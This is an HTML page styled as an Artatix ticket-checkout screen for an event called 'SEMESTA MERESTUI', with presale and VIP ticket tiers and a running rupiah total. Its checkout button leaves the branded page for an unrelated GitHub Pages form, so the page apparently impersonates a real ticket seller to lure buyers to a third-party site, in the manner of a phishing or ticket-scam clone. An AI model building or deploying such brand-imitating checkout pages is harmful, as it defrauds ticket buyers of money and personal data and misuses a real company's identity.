<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>SEMESTA MERESTUI - Ticketing</title>

<style>
*{
margin:0;
padding:0;
box-sizing:border-box;
font-family:Arial,sans-serif;
}

body{
background:#f4f7fc;
color:#222;
padding-bottom:140px;
}

.header{
background:#0b5cff;
color:#fff;
padding:16px;
display:flex;
justify-content:space-between;
align-items:center;
}

.logo{
font-size:22px;
font-weight:700;
}

.lang{
font-size:14px;
font-weight:600;
}

.step-wrap{
background:#fff;
display:flex;
justify-content:center;
align-items:center;
padding:16px 10px;
gap:8px;
border-bottom:1px solid #eee;
}

.step{
display:flex;
flex-direction:column;
align-items:center;
}

.step-circle{
width:30px;
height:30px;
border-radius:50%;
border:2px solid #cfd8dc;
display:flex;
align-items:center;
justify-content:center;
font-size:14px;
font-weight:bold;
background:#fff;
}

.step.active .step-circle{
background:#0b5cff;
border-color:#0b5cff;
color:#fff;
}

.step-text{
margin-top:5px;
font-size:11px;
color:#0b5cff;
font-weight:600;
}

.arrow{
color:#999;
font-size:20px;
}

.banner{
width:100%;
display:block;
}

.event-title{
background:#fff;
padding:16px;
font-size:22px;
font-weight:700;
}

.ticket-card{
background:#fff;
margin:12px;
border-radius:12px;
padding:16px;
box-shadow:0 2px 8px rgba(0,0,0,.08);
display:flex;
justify-content:space-between;
}

.ticket-left{
flex:1;
}

.ticket-name{
font-size:16px;
font-weight:700;
}

.ticket-price{
font-size:22px;
font-weight:700;
color:#0b5cff;
margin-top:10px;
}

.ticket-right{
display:flex;
flex-direction:column;
align-items:flex-end;
gap:8px;
}

.status{
font-size:12px;
font-weight:700;
padding:4px 10px;
border-radius:20px;
}

.sale{
background:#e8f0ff;
color:#0b5cff;
}

.sold{
background:#ffe5e5;
color:#d50000;
}

.select-btn{
background:#0b5cff;
color:#fff;
border:none;
border-radius:6px;
padding:6px 12px;
font-size:11px;
cursor:pointer;
}

.qty-box{
display:none;
align-items:center;
gap:8px;
}

.qty-btn{
width:28px;
height:28px;
border:none;
border-radius:50%;
background:#0b5cff;
color:#fff;
font-size:18px;
cursor:pointer;
}

.artatix-footer{
background:#fff;
margin-top:20px;
padding:40px 20px 160px;
text-align:center;
}

.footer-logo{
font-size:48px;
font-weight:700;
color:#2f45d3;
margin-bottom:20px;
}

.footer-contact{
font-size:20px;
font-weight:600;
margin:16px 0;
}

.artatix-footer hr{
border:none;
border-top:1px solid #ddd;
margin:30px 0;
}

.copyright{
color:#7b8794;
font-size:16px;
}

.checkout-footer{
position:fixed;
left:0;
right:0;
bottom:0;
background:#fff;
padding:16px;
border-top:1px solid #ddd;
box-shadow:0 -2px 10px rgba(0,0,0,.08);
}

.checkout-total{
display:flex;
justify-content:space-between;
font-size:18px;
font-weight:700;
margin-bottom:14px;
}

.buy-btn{
width:100%;
height:56px;
border:none;
border-radius:12px;
background:#3461ff;
color:#fff;
font-size:18px;
font-weight:700;
cursor:pointer;
}
</style>
</head>

<body>

<div class="header">
<div class="logo">Artatix</div>
<div class="lang">🇮🇩 ID</div>
</div>

<div class="step-wrap">
<div class="step active">
<div class="step-circle">1</div>
<div class="step-text">Pilih Kategori</div>
</div>

<div class="arrow">›</div>

<div class="step">
<div class="step-circle">2</div>
</div>

<div class="arrow">›</div>

<div class="step">
<div class="step-circle">3</div>
</div>

<div class="arrow">›</div>

<div class="step">
<div class="step-circle">4</div>
</div>
</div>

<img src="banner.png" class="banner" alt="Banner">

<div class="event-title">
SEMESTA MERESTUI
</div>

<!-- FESTIVAL PRESALE -->

<div class="ticket-card">
<div class="ticket-left">
<div class="ticket-name">FESTIVAL PRESALE</div>
<div class="ticket-price">Rp119.000</div>
</div>

<div class="ticket-right">
<span class="status sale">ON SALE</span>

<button class="select-btn" onclick="showQty(1,this)">
Pilih Tiket
</button>

<div class="qty-box" id="qty1">
<button class="qty-btn" onclick="minusQty('count1')">-</button>
<span id="count1">1</span>
<button class="qty-btn" onclick="plusQty('count1')">+</button>
</div>
</div>
</div>

<!-- VIP PRESALE 1 -->

<div class="ticket-card">
<div class="ticket-left">
<div class="ticket-name">VIP (PRESALE 1)</div>
<div class="ticket-price">Rp235.000</div>
</div>

<div class="ticket-right">
<span class="status sold">SOLD OUT</span>
</div>
</div>

<!-- VIP PRESALE 2 -->

<div class="ticket-card">
<div class="ticket-left">
<div class="ticket-name">VIP (PRESALE 2)</div>
<div class="ticket-price">Rp300.000</div>
</div>

<div class="ticket-right">
<span class="status sale">ON SALE</span>

<button class="select-btn" onclick="showQty(2,this)">
Pilih Tiket
</button>

<div class="qty-box" id="qty2">
<button class="qty-btn" onclick="minusQty('count2')">-</button>
<span id="count2">1</span>
<button class="qty-btn" onclick="plusQty('count2')">+</button>
</div>
</div>
</div>

<div class="artatix-footer">
<div class="footer-logo">Artatix</div>

<div class="footer-contact">
📞 +62 821–3767–6220
</div>

<div class="footer-contact">
✉ cs@artatix.co.id
</div>

<hr>

<div class="copyright">
© 2026 Artatix. Hak Cipta Dilindungi.
</div>
</div>

<div class="checkout-footer">

<div class="checkout-total">
<div>0 Tiket</div>
<div>Rp0</div>
</div>

<button class="buy-btn" onclick="checkout()">
Beli Sekarang
</button>

</div>

<script>

const ticketPrices = {
count1:119000,
count2:300000
};

function formatRupiah(number){
return "Rp" + number.toLocaleString("id-ID");
}

function showQty(id,btn){
document.getElementById("qty"+id).style.display="flex";
btn.style.display="none";
updateTotal();
}

function plusQty(id){
let el=document.getElementById(id);
el.innerText=parseInt(el.innerText)+1;
updateTotal();
}

function minusQty(id){
let el=document.getElementById(id);
let val=parseInt(el.innerText);

if(val>1){
el.innerText=val-1;
updateTotal();
}
}

function updateTotal(){

let totalQty=0;
let totalPrice=0;

if(document.getElementById("qty1").style.display==="flex"){
let qty1=parseInt(document.getElementById("count1").innerText);
totalQty+=qty1;
totalPrice+=qty1*ticketPrices.count1;
}

if(document.getElementById("qty2").style.display==="flex"){
let qty2=parseInt(document.getElementById("count2").innerText);
totalQty+=qty2;
totalPrice+=qty2*ticketPrices.count2;
}

document.querySelector(".checkout-total div:first-child").innerText=
totalQty+" Tiket";

document.querySelector(".checkout-total div:last-child").innerText=
formatRupiah(totalPrice);

}

function checkout(){

let totalQty=parseInt(
document.querySelector(".checkout-total div:first-child").innerText
);

if(totalQty<=0){
alert("Silakan pilih tiket terlebih dahulu");
return;
}

window.location.href="https://eticketdigital.github.io/Semesta-merestui-From/";

}

updateTotal();

</script>

</body>
</html>
